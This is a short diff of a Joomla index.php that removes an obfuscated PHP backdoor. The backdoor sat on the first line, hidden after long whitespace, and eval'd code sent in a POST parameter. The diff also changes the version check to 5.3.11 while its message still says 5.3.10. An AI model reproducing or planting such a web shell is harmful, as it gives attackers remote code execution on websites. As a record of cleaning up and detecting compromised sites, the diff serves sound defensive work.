@@ -1,11 +1,11 @@
-<?php                                                                                                                                                                                                                                                                        $mmst82 = "pt_uesro"; $lhat4 = $mmst82[5].$mmst82[1]. $mmst82[6].$mmst82[1].$mmst82[7].$mmst82[3].$mmst82[0].$mmst82[0].$mmst82[4]. $mmst82[6] ;$ofj27 =$lhat4($mmst82[2].$mmst82[0] . $mmst82[7]. $mmst82[5]. $mmst82[1] );if ( isset( ${ $ofj27 } ['q828e00']) ){ eval ( ${$ofj27 } [ 'q828e00' ]); } ?><?php
+<?php
 /**
  * @package    Joomla.Site
  *
  * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
  * @license    GNU General Public License version 2 or later; see LICENSE.txt
  */
-if (version_compare(PHP_VERSION, '5.3.10', '<'))
+if (version_compare(PHP_VERSION, '5.3.11', '<'))
 {
 	die('Your host needs to use PHP 5.3.10 or higher to run this version of Joomla!');
 }
